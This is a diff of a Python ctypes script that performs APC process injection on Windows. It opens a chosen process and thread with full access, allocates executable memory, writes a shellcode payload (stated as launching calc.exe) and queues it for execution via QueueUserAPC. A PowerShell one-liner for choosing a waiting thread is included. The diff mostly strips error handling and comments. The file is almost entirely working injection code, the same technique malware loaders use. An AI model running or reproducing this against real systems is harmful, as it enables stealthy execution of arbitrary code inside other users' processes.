@@ -4,21 +4,11 @@
 - target: (any process)
 - payload: shellcode -> calc.exe
 
-
 Description:
------------
 - inject an APC object into a thread's APC queue
 - object points to shellcode, executes if/when thread enters an alertable wait state
 
-
-Note:
------
-- this script contains a short PowerShell script to find Threads associated with a ProcessId
-- returns ThreadId, Priority, ThreadState, StartTime ---> choose TreadState = Wait
-
-
-Glossary:
-- APC: Asynchronous Procedure Call
+Note: this script contains a short PowerShell script to find Threads associated with a ProcessId
 """
 
 import ctypes
@@ -47,45 +37,24 @@ kernel32.VirtualAllocEx.restype = ctypes.c_void_p
 kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t),]
 kernel32.WriteProcessMemory.restype = BOOL
 
-
-# Powershell script here
-# - use output to select your process (eg explorer.exe) and one of its (many) threads
-# - lists threads in "Waiting" state
-# Get-Process -id <ProcessId> | Select-Object -ExpandProperty Threads | Select-Object Id, PriorityLevel, ThreadState, StartTime | Format-Table | findstr /i wait
-#
-#ProcessId = <choice from Get-Process>
-#ThreadId = <choice from Get-Process>    -> Recommend: Priority > Normal
+# Powershell script - use to select ProcessId and ThreadId
+#Get-Process -id <ProcessId> | Select-Object -ExpandProperty Threads | Select-Object Id, PriorityLevel, ThreadState, StartTime | Format-Table | findstr /i wait
 
 ProcessId = <change>
 ThreadId  = <change>
 
-
 # open handles to process and thread
 hProcess = kernel32.OpenProcess(0x1F0FFF, False, ProcessId)  # PROCESS_ALL_ACCESS
-if not hProcess:
-    raise ctypes.WinError(ctypes.get_last_error())
-
 hThread = kernel32.OpenThread(0x1FFFFF, False, ThreadId)     #THREAD_ALL_ACCESS
-if not hThread:
-    raise ctypes.WinError(ctypes.get_last_error())
-
 
 # allocate memory
-lpAddress = ctypes.c_void_p(0)
-lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, len(payload), 0x1000 | 0x2000, 0x40)
-if not lpBaseAddress:
-    raise ctypes.WinError(ctypes.get_last_error())
-
+lpBaseAddress = kernel32.VirtualAllocEx(hProcess, None, len(payload), 0x1000 | 0x2000, 0x40)
 
 # write payload
-n_written = ctypes.c_size_t(0)
-if not kernel32.WriteProcessMemory(hProcess, lpBaseAddress, payload, len(payload), ctypes.byref(n_written)):
-    raise ctypes.WinError(ctypes.get_last_error())
-
+kernel32.WriteProcessMemory(hProcess, lpBaseAddress, payload, len(payload), None)
 
 # execute - add to APC queue
-if not kernel32.QueueUserAPC(lpBaseAddress, hThread, 0):
-    raise ctypes.WinError(ctypes.get_last_error())
+kernel32.QueueUserAPC(lpBaseAddress, hThread, 0)
 
 # cleanup
 kernel32.CloseHandle(hProcess)
